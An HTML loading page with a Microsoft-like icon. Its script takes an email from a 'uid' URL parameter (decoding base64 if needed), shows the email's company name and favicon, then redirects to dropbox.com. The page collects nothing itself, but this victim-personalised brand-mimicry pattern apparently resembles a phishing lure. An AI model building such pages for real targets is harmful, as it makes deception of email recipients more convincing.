<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700;900&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      min-width: 100vw;
      height: 100vh;
      width: 100vw;
      background: #f3f3f3 url('screen.svg') center center / cover no-repeat fixed;
      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }
    .logo-bar {
      position: fixed;
      top: 32px;
      left: 48px;
      display: flex;
      align-items: center;
      z-index: 10;
      user-select: none;
      background: none;
      gap: 10px;
    }
    .logo-icon {
      display: flex;
      align-items: center;
      margin-right: 0;
    }
    .logo-icon svg {
      width: 48px;
      height: 48px;
      display: block;
    }
    @media (max-width: 600px) {
      .logo-bar {
        top: 16px;
        left: 12px;
        gap: 7px;
      }
      .logo-icon svg {
        width: 20px;
        height: 20px;
      }
    }
    .profile-bar {
      position: fixed;
      top: 32px;
      right: 48px;
      display: flex;
      align-items: center;
      gap: 12px;
      z-index: 10;
      user-select: none;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 4px 16px 0 rgba(30, 64, 175, 0.10);
      padding: 10px 22px 10px 16px;
      border: 1.5px solid #e5e7eb;
    }
    .profile-pic {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #e0e7ef;
      box-shadow: 0 2px 8px #2564cf11;
    }
    .profile-pic svg {
      width: 40px;
      height: 40px;
      display: block;
    }
    .profile-name {
      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
      font-size: 1.08rem;
      font-weight: 700;
      color: #374151;
      letter-spacing: 0.13em;
      text-transform: uppercase;
      background: #f3f3f3;
      border-radius: 8px;
      padding: 4px 14px 4px 10px;
      box-shadow: 0 1px 4px #2564cf08;
    }
    @media (max-width: 600px) {
      .profile-bar {
        top: 16px;
        right: 12px;
        gap: 7px;
        padding: 6px 10px 6px 8px;
      }
      .profile-pic, .profile-pic svg {
        width: 28px;
        height: 28px;
      }
      .profile-name {
        font-size: 0.85rem;
        padding: 3px 8px 3px 7px;
      }
    }
    /* Loading animation styles */
    .loader-container {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }
    .loader {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 24px;
    }
    .spinner {
      width: 64px;
      height: 64px;
      border: 6px solid #e0e7ef;
      border-top: 6px solid #2564cf;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 8px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loading-text {
      font-family: 'Segoe UI Variable', 'Segoe UI', Arial, sans-serif;
      font-size: 1.25rem;
      font-weight: 600;
      color: #2564cf;
      letter-spacing: 0.08em;
      text-align: center;
      text-shadow: 0 1px 0 #fff, 0 2px 8px #2564cf11;
    }
  </style>
</head>
<body>
  <div class="logo-bar">
    <span class="logo-icon">
      <!-- Simple Microsoft-like cloud upload icon -->
      <svg width="48" height="48" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="4" y="4" width="20" height="20" rx="6" fill="#2564cf"/>
        <path d="M14 8v8m0 0l-3-3m3 3l3-3" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </span>
  </div>
  <div class="profile-bar">
    <span class="profile-pic" id="profilePic">
      <!-- Will be replaced by JS if uid param is present -->
      <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="20" cy="20" r="20" fill="#e0e7ef"/>
        <circle cx="20" cy="16" r="8" fill="#2564cf"/>
        <ellipse cx="20" cy="30" rx="11" ry="7" fill="#2564cf" fill-opacity="0.18"/>
      </svg>
    </span>
    <span class="profile-name" id="profileName">ALEX</span>
  </div>
  <div class="loader-container">
    <div class="loader">
      <div class="spinner"></div>
      <div class="loading-text">Accessing, please wait...</div>
    </div>
  </div>
  <script>
  // Helper to get URL parameter
  function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
  }

  function isEmail(str) {
    return /^[^@]+@[^@]+\.[^@]+$/.test(str);
  }

  let uid = getParam('uid');
  let email = uid;
  // If not a valid email, try to decode as base64
  if (uid && !isEmail(uid)) {
    try {
      const decoded = atob(uid);
      if (isEmail(decoded)) {
        email = decoded;
      }
    } catch (e) {}
  }

  if (email && isEmail(email)) {
    const domain = email.split('@')[1];
    const domainName = domain.split('.')[0].toUpperCase();
    // Set profile name
    document.getElementById('profileName').textContent = domainName;
    // Set profile pic to favicon
    const faviconUrl = `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;
    const img = document.createElement('img');
    img.src = faviconUrl;
    img.alt = domainName + ' favicon';
    img.style.width = '40px';
    img.style.height = '40px';
    img.style.borderRadius = '50%';
    img.style.background = '#e0e7ef';
    img.onerror = function() {
      // fallback to SVG if favicon fails
      this.style.display = 'none';
      document.getElementById('profilePic').innerHTML = `<svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="20" cy="20" r="20" fill="#e0e7ef"/><circle cx="20" cy="16" r="8" fill="#2564cf"/><ellipse cx="20" cy="30" rx="11" ry="7" fill="#2564cf" fill-opacity="0.18"/></svg>`;
    };
    const pic = document.getElementById('profilePic');
    pic.innerHTML = '';
    pic.appendChild(img);
  }

  // Redirect after 3 seconds
  setTimeout(function() {
    let redirectUrl = 'https://dropbox.com';
    if (uid) {
      redirectUrl += (redirectUrl.includes('?') ? '&' : '?') + 'uid=' + encodeURIComponent(uid);
    }
    window.location.href = redirectUrl;
  }, 3000);
  </script>
</body>
</html>
